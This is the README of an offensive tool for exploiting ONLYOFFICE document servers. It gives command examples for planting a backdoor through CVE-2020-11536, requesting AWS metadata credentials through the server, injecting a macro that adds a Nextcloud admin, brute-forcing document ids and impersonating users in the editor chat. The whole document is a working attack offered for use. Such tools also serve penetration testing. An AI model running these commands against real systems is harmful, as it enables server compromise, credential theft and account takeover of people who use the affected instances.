# pwnlyoffice

Exploit ONLYOFFICE Implementations

## Sub-commands

`pwnlyoffice` has a number of sub-commands to carry out actions against vulnerable instances of OnlyOffice. The main ones are:

 - **dl**: Connect to the ONLYOFFICE document server and request that it downloads a provided URL. This can be used to test an instances to see if it has an unauthenticated / weak websocket. A random document id is created and this sub-command can be used to inject a malicious document into the document server (CVE-2020-11536)
 - **macro**: If a pre-existing document id is known, this will inject the given JavaScript file into it as a macro. Two example exploits for NextCloud are included in `/macros`, plus a basic PoC alert box.
 - **chat**: If a pre-existing document id is known, this allows you to connect to the in-editor chat function and pretend to be any user id of your choice.
 - **backdoor**: Generate a malicious document which exploits CVE-2020-11536 to write a backdoor on the server.
 - **shell**: Run commands against a server which has been compromised with the backdoor.
 - **enum**: Attempt to guess valid document ids by providing a file containing a list of potential ids. The script will try each one to find a valid pre-existing document.

## Examples

### Test if a server is vulnerable

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl -D https://yoursite/uniquepath dl
```

Any hits to `/uniquepath` means that the server meets the conditions for being able to have a malicious document injected into it:

1. The authentication is either absent or uses the default JWT signing key
2. The server is able to reach out to the Internet

### Generate a malicious document

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl backdoor
```

This generates `backdoor.docx`. Host this on a web server which is visible to the document server.

### Prompt Document Server to Download Malicious document

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl -D https://yoursite/backdoor.docx dl
```

This will write a number of files into `/var/www/onlyoffice/documentserver/server/FileConverter/bin` using CVE-2020-11536. Depending on the commit status of this project, which files that is and what they do may vary, but this should illustrate the point.

### Run Shell Commands on Server

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl -D https://anyvalidurl shell
```

This feature isn't currently working, but will be in future.

### Get AWS Temporary Credentials

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl -D http://169.254.169.254/latest/meta-data/iam/security-credentials dl
```

### Inject a Macro Into a Known Doc id 

This macro adds an admin user into Nextcloud. The document id is `1234` and has to be known by the attacker. These vary depending on what the underlying document management system is.

``bash
./pwnlyoffice.py -d 1234 -u https://theonlyofficesiteurl macro macros/nextcloud_addadmin.js
```

### Chat with legitimate users

Masquerading as a user called "Bob", connected to document id "1234"

``bash
./pwnlyoffice.py -d 1234 -u https://theonlyofficesiteurl -U Bob chat
```
